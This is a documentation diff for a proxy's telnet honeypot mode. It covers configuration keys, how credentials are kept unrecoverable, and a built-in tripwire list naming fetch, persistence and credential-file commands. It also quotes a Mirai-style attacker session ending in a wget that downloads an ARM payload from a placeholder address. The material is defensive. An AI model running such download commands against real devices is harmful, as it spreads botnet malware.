@@ -4377,6 +4377,119 @@ access line with the client, the name the factor was checked against,
 the target, how it ended and how many options were refused. Refusals
 are `telnet_denied` deny events, so bans apply.
 
+#### server.listeners[].telnet.deception
+
+A login that is not there.
+
+A telnet port on a public address is found within the hour, and what finds it is a
+*dictionary*: the Mirai family and everything written after it walk a list of the
+credentials that shipped on recorders, cameras and routers — a few thousand pairs,
+tried a handful at a time from a great many addresses.
+
+Refusing collects the address, which the firewall log already has. Answering
+collects the **list** — which pairs are in circulation this month, and whether any
+of them is one of yours — and then, because the login is accepted, what the thing
+came to do:
+
+```
+enable / system / shell / sh          is this a shell
+/bin/busybox MIRAI                    is it busybox, and which one
+echo -e '\x6b\x61\x6d\x69'            is anything actually reading this
+cat /proc/cpuinfo                     which payload do I need
+wget http://198.51.100.9/bins/x.arm7  and here is where it lives
+```
+
+That last line is the artefact. It names the payload, the address serving it and
+the architecture it was built for, and nothing else in this proxy produces it.
+
+```yaml
+telnet:
+  # A honeypot: no upstream, because there is no equipment behind it.
+  deception:
+    mode: decoy
+    profile: busybox
+    hostname: cam-07        # something this estate really has
+    attempts: 2
+    tripwire: [payroll]
+```
+
+| Key | Type | Default | Description |
+|-----|------|---------|-------------|
+| `enabled` | bool | `true` | Turns the section off without removing it |
+| `mode` | `answer`, `decoy` | `answer` | `answer`: a session this listener was going to refuse gets the fabrication instead. `decoy`: the whole listener is a fabricated device, with no `upstream` |
+| `clients` | list of CIDR | | The networks that get the fabrication. **Required in mode `answer`.** In mode `decoy` an empty list means every client |
+| `profile` | `busybox`, `linux` | `busybox` | The machine being impersonated: a recorder or camera (what is actually on port 23), or a small server |
+| `hostname` | string | the profile's | What a visitor reads in the login prompt, the shell prompt, `uname -a` and `/etc/hostname`. **Name it after something this estate really has** |
+| `attempts` | int | `1` | How many credentials are taken before the login is accepted (0 to 16). Two or three is what a real device's login looks like, and collects more of the dictionary |
+| `tripwire` | list | | Command names that raise a `telnet_tripwire` event. **In addition to** the built-in set below |
+| `seed` | int | from the listener name | Makes the fabricated numbers reproducible across restarts |
+| `period` | duration | `30s` | How long one sample of a fabricated number lasts — here the load average and the number of users logged in |
+| `max_clients` | int | `1024` | Bounds the record of who has been answered |
+
+**No password is recorded, in any form a guess can be tested against.** What is
+kept for each attempt is the user name (an identity, like every other kind's), the
+credential's **length**, and a `credential_id` — a handle computed under a key the
+process made at startup from the system random source and never writes down. That
+answers the question an operator actually has (*how many distinct passwords did
+this client try, and have we seen this one before*) and answers nothing to anybody
+who later reads the log. After a restart the handles are new, which is correct: the
+question is about a session or a campaign, not about the password. A process with
+no random source produces no handle at all rather than one under a constant key.
+
+The recording, where one is configured, holds the shell transcript and not the
+login: the credential prompts are written straight to the client and never reach
+the file, even with `input: true`.
+
+**The login never turns on the credential.** Every credential is accepted once
+`attempts` have been taken, and which one it was makes no difference to what
+happens next. A trap that accepted the right password and refused the wrong one
+would be a credential oracle, which is the one thing a password list needs.
+
+**In mode `answer` it replaces the refusals that happen after the proxy has
+spoken**: a failed or locked second factor, the estate's `authorization` policy,
+and a missing access grant. It does **not** replace `allow_clients` or a ban — an
+address that may not connect gets nothing, which is what the list means — and it
+never replaces an *outage*: a target that cannot be reached is an outage, and an
+operator working an incident must not be handed a fabricated device instead of
+"the target is unavailable".
+
+**A `decoy` listener will not compile with `mfa` or `require_grant`.** Its own
+login prompt is the trap and accepts everybody by design, so a factor in front of
+it would refuse the visitors it exists to collect, and a grant would be checked
+against a name nobody real typed. Validation says so rather than ignoring the
+setting. It also does not warn about the missing `tls` section: an unencrypted
+telnet port is what the scanning is looking for.
+
+**Nothing is run and nothing is fetched.** `wget`, `curl`, `tftp` and `ftpget`
+answer the connection timeout a device behind a firewall answers — after the
+address has been recorded. A fabrication that fetched the payload would be doing
+the download on the attacker's behalf, from this estate's address and with this
+estate's reputation.
+
+**The tripwires need no configuring**: the escalation, in the order it happens —
+`wget`, `curl`, `tftp`, `nc` (fetch it), `chmod`, `chattr`, `dd` (make it run),
+`nohup`, `setsid`, `insmod` (keep it running), `crontab`, `iptables`, `systemctl`
+(clear what would have stopped it), `busybox`, and the file names a credential
+lives in (`shadow`, `authorized_keys`, `id_rsa`). A command named by its path
+counts — `/usr/bin/wget` is `wget` — and `passwd` is deliberately *not* in the set,
+because `/etc/passwd` is the commonest reconnaissance on any machine and a tripwire
+that matched it would make every session look like an escalation.
+
+**What it will not invent**: `/etc/shadow` lists the accounts with `*` where a hash
+would be, because a fabricated hash is a machine's worth of somebody's time and a
+thing an operator could later mistake for real; `/tmp` is empty; and the shell
+history is empty, because a fabricated one would be inventing a person who used
+this machine.
+
+A session is bounded in commands as well as by `idle_timeout` and
+`session_timeout`, so a script in a loop cannot hold a worker on a listener whose
+whole purpose is to be found.
+
+Counters: `telnet_deceived` and `telnet_tripwire`. Security events:
+`telnet_credential` (the user name, the length, the handle and whether that
+attempt was accepted), `telnet_deceived` and `telnet_tripwire` (the command, one
+line, clipped). `xproxyctl decoys` lists what each fabrication has seen.
+
 ### server.listeners[].ftp (kind: ftp)
 
 A `kind: ftp` listener is a protocol-aware FTP proxy: the proxy is an
@@ -6896,7 +7009,7 @@ comes from a trusted proxy chain or `action` is `reject`.
 | Key | Type | Default | Description |
 |-----|------|---------|-------------|
 | `name` | name | required, unique | Appears in the ban entry as `trigger:<name>` |
-| `reasons` | list | `[]` (all) | Deny categories that count: `acl`, `rate_limit`, `waf`, `body_size`, `uri_length`, `bad_host`, `no_route`, `websocket`, `concurrency`, `challenge`, `jwt`, `icap`, `geo`, `tcp_no_route`, `forward_denied`, `forward_auth`, `honeypot`, `dns_blocked`, `dns_bogus`, `dns_rpz`, `honeytoken`, `account_abuse`, `api_abuse`, `threat_intel`, `scim`, `smtp_denied`, `mqtt_denied`, `ssh_denied`, `ftp_denied`, `syslog_denied`, `telnet_denied`, `vnc_denied`, `rdp_denied`, `forward_sni_mismatch`, `dns_tunnel`, `dns_answer_denied`, `sftp_icap`, `tcp_denied`, `udp_denied`, `modbus_denied`, `iec104_denied`, `snmp_denied`, `ldap_denied`, `tftp_denied`, `dhcp_denied`, `postgres_denied`, `mysql_denied`, `tds_denied`, `redis_denied`, `bacnet_denied`, `amqp_denied`, `s7_denied`, `ntp_denied`, `ntske_denied`, `dns_denied`, `dns_threat_intel`, `dns_deceived`, `dns_tripwire`, `yara` |
+| `reasons` | list | `[]` (all) | Deny categories that count: `acl`, `rate_limit`, `waf`, `body_size`, `uri_length`, `bad_host`, `no_route`, `websocket`, `concurrency`, `challenge`, `jwt`, `icap`, `geo`, `tcp_no_route`, `forward_denied`, `forward_auth`, `honeypot`, `dns_blocked`, `dns_bogus`, `dns_rpz`, `honeytoken`, `account_abuse`, `api_abuse`, `threat_intel`, `scim`, `smtp_denied`, `mqtt_denied`, `ssh_denied`, `ftp_denied`, `syslog_denied`, `telnet_denied`, `vnc_denied`, `rdp_denied`, `forward_sni_mismatch`, `dns_tunnel`, `dns_answer_denied`, `sftp_icap`, `tcp_denied`, `udp_denied`, `modbus_denied`, `iec104_denied`, `snmp_denied`, `ldap_denied`, `tftp_denied`, `dhcp_denied`, `postgres_denied`, `mysql_denied`, `tds_denied`, `redis_denied`, `bacnet_denied`, `amqp_denied`, `s7_denied`, `ntp_denied`, `ntske_denied`, `dns_denied`, `dns_threat_intel`, `dns_deceived`, `dns_tripwire`, `telnet_tripwire`, `yara` |
 | `threshold` | int | required | Denies within `window` that trigger the ban |
 | `window` | duration | required | At most 24h |
 | `duration` | duration | required | First ban length |
